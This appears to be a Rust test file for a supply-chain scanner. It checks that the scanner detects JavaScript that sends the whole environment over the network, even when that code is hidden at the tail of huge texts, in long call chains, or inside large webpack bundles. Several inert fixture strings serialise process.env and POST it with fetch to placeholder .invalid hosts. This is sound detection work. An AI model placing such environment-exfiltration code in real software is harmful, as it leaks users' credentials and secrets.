//! BIG-BUNDLE-TAIL: a big text's tail is read. The supply-chain tree reads a text up to 16,000,000 characters (the
//! largest the scans read), and the text follower, which answers where the tree cannot (a text the parser refuses,
//! one past the tree's own budget), reads a text whole: each of its lists holds as many items as a text of its length
//! may, what it reads is charged to the call's budget, and a list a limit stops before the text's end is a cut
//! (budget::cut): the call answers as one that ran out, in the limit's words, unless it reports the cut itself (the
//! import-time test's `unread`). The texts are inert: nothing here is run; the hosts are `.invalid`.

use crate::budget;
use crate::json::Value;
use crate::pystr;

fn cps(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

/// The follower's answer on `text`, as one call would read it, and the cut its reading left, if any.
fn followed(text: &str) -> (Option<(&'static str, String)>, Option<String>) {
    let p = crate::pack::current();
    let t = cps(text);
    budget::reset(budget::DEFAULT_STEPS);
    let got = super::local_data_sent_at(&p, &t).map(|(_, kind, what, _)| (kind, pystr::to_string(&what)));
    (got, budget::take_cut())
}

fn whole() -> Option<(&'static str, String)> {
    Some(("environment", "the whole environment".to_string()))
}

const HARVEST: &str = "reads credentials or the whole environment and sends data over the network";

/// The import-time test as the registry asks it (`unread`): (reasons, the cut).
fn import_unread(text: &str) -> (Vec<String>, Option<String>) {
    let args = Value::obj(vec![("lang", Value::str("js")), ("unread", Value::Bool(true))]);
    match crate::api::call("import_time_risk", &args, &cps(text)) {
        Ok(Value::Arr(a)) => {
            let reasons = match &a[0] {
                Value::Arr(r) => r.iter().map(|v| pystr::to_string(v.as_str().unwrap())).collect(),
                _ => panic!("{:?}", a[0]),
            };
            let cut = a.get(3).and_then(|v| v.as_str()).map(pystr::to_string);
            (reasons, cut)
        }
        other => panic!("{other:?}"),
    }
}

/// The review's tail (REVIEW-FP-GITHUB-SCRIPT.md): `n` assignments before the environment's (the follower read the
/// first 5,000).
fn tail_case(n: usize) -> String {
    let mut out: String = (0..n).map(|k| format!("const z{k}=0;\n")).collect();
    out.push_str("const payload=JSON.stringify(process.env);\nfetch('https://review.invalid/collect',{method:'POST',body:payload});\n");
    out
}

/// Code the parser refuses (the follower answers for it): an unclosed call at the end.
const REFUSED: &str = "\nfunction refused( {\n";

#[test]
fn the_tail_past_the_packs_limits_is_read() {
    for n in [0, 4_998, 4_999, 5_000, 5_001, 6_000, 60_000] {
        let text = tail_case(n);
        assert_eq!(followed(&text), (whole(), None), "{n} assignments before it");
        // the import-time test: the tree's, and the follower's where the parser refuses the text
        let refused = format!("{text}{REFUSED}");
        assert!(crate::jsflow::supply::refusal(&cps(&refused)).is_some());
        for t in [&text, &refused] {
            assert_eq!(import_unread(t), (vec![HARVEST.to_string()], None), "{n}");
        }
    }
}

/// `n` functions, each giving its parameter to the one before it in the text; the first in the text sends it, the
/// last is given the environment: each pass follows the data one function on.
fn backward_chain(n: usize) -> String {
    let mut out = format!("function g{}(v) {{ fetch('https://c.invalid/x', {{ method: 'POST', body: v }}); }}\n", n - 1);
    for k in (0..n - 1).rev() {
        out.push_str(&format!("function g{k}(v) {{ g{}(v); }}\n", k + 1));
    }
    out.push_str("g0(JSON.stringify(process.env));\n");
    out
}

#[test]
fn a_limit_met_is_a_cut() {
    // no list stops before a text's end but in a text made of little else: a chain longer than the reading's passes
    // does; the reading stops there and says so
    assert_eq!(followed(&backward_chain(200)), (whole(), None));
    let text = format!("{}{REFUSED}", backward_chain(300));
    let (got, cut) = followed(&text);
    assert_eq!(got, None);
    let cut = cut.expect("a cut");
    assert_eq!(cut, "the text follower reads at most 256 passes over the names, and this text's still had more to give");
    // the import-time test asked for it (the registry's) says so beside what it found; a call without it answers as
    // one that ran out, in the limit's words
    let found = format!("{}{text}", "const payload=JSON.stringify(process.env);\nfetch('https://c.invalid/x',{method:'POST',body:payload});\n");
    assert_eq!(import_unread(&found), (vec![HARVEST.to_string()], Some(cut.clone())));
    let text = found;
    // asked without it, the call answers as one that ran out, in the limit's words
    let args = Value::obj(vec![("lang", Value::str("js"))]);
    assert!(matches!(crate::api::call("import_time_risk", &args, &cps(&text)), Err(crate::api::CallError::Exhausted)));
    assert_eq!(budget::last_cut(), Some(cut));
}

#[test]
fn a_reading_past_the_calls_budget_answers_as_one_that_ran_out() {
    // the follower's reading charged to the call's budget: a call with too few steps for its reading does not answer
    let text = format!("{}{REFUSED}", tail_case(20_000));
    let args = Value::obj(vec![("lang", Value::str("js")), ("budget", Value::Int(20_000))]);
    assert!(matches!(crate::api::call("local_data_sent_at", &args, &cps(&text)), Err(crate::api::CallError::Exhausted)));
    assert_eq!(budget::last_cut(), None);
    let enough = Value::obj(vec![("lang", Value::str("js"))]);
    assert!(crate::api::call("local_data_sent_at", &enough, &cps(&text)).is_ok());
}

/// A webpack/ncc-style module, a little over 1 KB of benign code.
fn module(k: usize) -> String {
    format!(
        "/***/ {k}:\n/***/ ((module, exports, __nccwpck_require__) => {{\n\"use strict\";\n\
         function normalize{k}(options) {{\n  options = options || {{}};\n  const result = {{ retries: options.retries || 3, name: \"m{k}\" }};\n  return result;\n}}\n\
         class Client{k} {{\n  constructor(base) {{ this.base = base; this.options = normalize{k}({{ retries: {} }}); }}\n\
           path(p) {{ return this.base + \"/\" + p.split(\"/\").filter((s) => s.length > 0).map((s) => encodeURIComponent(s)).join(\"/\"); }}\n\
           format(data) {{ let out = \"\"; for (const key of Object.keys(data)) {{ out += key + \"=\" + String(data[key]).replace(/[\\n\\r]/g, \" \") + \";\"; }} return out; }}\n}}\n\
         const cache{k} = new Map();\nfunction lookup{k}(key) {{ if (cache{k}.has(key)) return cache{k}.get(key); const v = key + {k}; cache{k}.set(key, v); return v; }}\n\
         module.exports = {{ Client{k}, lookup{k}, normalize{k} }};\n/***/ }}),\n\n",
        k % 7
    )
}

/// A bundle of `size` characters or a little more: its modules, `code` among them at `at` (0: the first; 1: the
/// last) and `main`, the entry's code, at its end.
fn bundle(size: usize, code: &str, at: f64, main: &str) -> String {
    let mut mods: Vec<String> = Vec::new();
    let mut n = 0;
    while n < size {
        let m = module(10_000 + mods.len());
        n += m.len();
        mods.push(m);
    }
    let k = ((mods.len() as f64) * at) as usize;
    mods.insert(k.min(mods.len()), format!("/***/ 99:\n/***/ ((module, exports, __nccwpck_require__) => {{\n\"use strict\";\n{code}\n/***/ }}),\n\n"));
    format!("var __webpack_modules__ = ({{\n\n{}}});\n(() => {{\n{main}\n}})();\n", mods.concat())
}

#[test]
fn a_bundle_past_two_million_characters_is_read_by_the_tree() {
    let send = "fetch('https://c.invalid/x', { method: 'POST', body: JSON.stringify(process.env) });";
    for (what, text) in [
        ("at its start", bundle(2_100_000, send, 0.0, "")),
        ("at its end", bundle(2_100_000, "", 1.0, send)),
    ] {
        assert!(text.len() > 2_000_000);
        let t = cps(&text);
        assert!(matches!(crate::jsflow::supply::local_data_sent(&t), crate::jsflow::supply::Answer::Found(..)), "{what}");
        assert_eq!(import_unread(&text), (vec![HARVEST.to_string()], None), "{what}");
    }
    // a benign one: nothing, and nothing unread
    let benign = bundle(2_100_000, "", 0.5, "");
    assert!(matches!(crate::jsflow::supply::local_data_sent(&cps(&benign)), crate::jsflow::supply::Answer::Nothing));
    assert_eq!(import_unread(&benign), (Vec::<String>::new(), None));
}
